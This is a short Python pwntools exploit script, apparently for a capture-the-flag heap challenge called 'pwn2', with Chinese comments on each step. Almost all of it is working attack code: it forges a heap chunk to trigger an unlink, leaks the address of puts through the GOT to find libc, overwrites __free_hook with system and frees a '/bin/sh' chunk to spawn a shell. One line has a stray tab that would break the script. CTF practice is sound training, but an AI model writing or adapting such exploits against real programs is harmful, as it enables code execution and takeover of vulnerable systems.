# -*- coding: utf-8 -*-
from PwnContext.core import *
local = True

exe = './' + 'pwn2'
elf = context.binary = ELF(exe)


ctx.binary = exe
libc = args.LIBC or 'libc.so.6'
ctx.debug_remote_libc = True
ctx.remote_libc = libc

if local:
    io = ctx.start()
    libc = ELF(libc)
else:
    io = remote(host,port)
    libc = ELF(libc)

def add(size):
    io.sendlineafter("your choice :\n", "1")
    io.sendlineafter("please input the size :\n", str(size))

def delete(idx):
    io.sendlineafter("your choice :\n", "2")
    io.sendlineafter("delete which ?\n",str(idx))

def show(idx):
    io.sendlineafter("your choice :\n", "3")
    io.sendlineafter("show which ?\n", str(idx))

def record(idx, content):
    io.sendlineafter("your choice :\n", "4")
    io.sendlineafter("record which?\n", str(idx))
    io.sendlineafter("content?\n", content)

def exit():
    io.sendlineafter("your choice :\n", "5")


def exp():

    ptr = 0x6020c0
    add(0x40)
    add(0x80)
    add(0x40)
    add(0x40)
    payload = p64(0) + p64(0x40) + p64(ptr-0x18) + p64(ptr-0x10)  #伪造chunk
    payload = payload.ljust(0x40)
    payload += p64(0x40)   #prev_size 表示前一个chunk在unsortbin中
    payload += p64(0x90)   #本chunk大小，标志位为0.表示前一个为free状态
    record(0, payload)
    record(1, "1"*0x10)
	delete(1)  #完成unlink 操作---ptr = addr(ptr) -24 
    #show(0)
    payload = 'a'*0x18 + p64(0x6020c8+0x8) + p64(0) + p64(elf.got['puts'])  #去bss段上面修改数据
    record(0, payload)
    gdb.attach(io)
    show(2)
    io.recvuntil("the content is :")
    io.recvline()
    puts_addr = u64(io.recvline().strip().ljust(8, '\x00'))
    io.success("puts_addr: 0x%x" % puts_addr)
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search("/bin/sh").next()
    free_hook = libc_base + libc.symbols['__free_hook']

    record(3, "/bin/sh")
    record(0, p64(free_hook))  #0因为上面改的0x6020c8+8，修改了bss段上chunk0的数据指针，修改来指向chunk2的数据指针的保存位置
    record(2, p64(system_addr))
    delete(3)
    #gdb.attach(io)

    #delete(0)

if __name__ == '__main__':
    exp()
    io.interactive()
#   小记，这一题我直接用fastbin attack 打malloc_hook。没有一个onegadget成功
#   用fastbin attack 打free_hook。打过去程序崩溃，似乎是改了一些不该改的东西？？？
#   所以还是用了别人的exp，呜呜呜
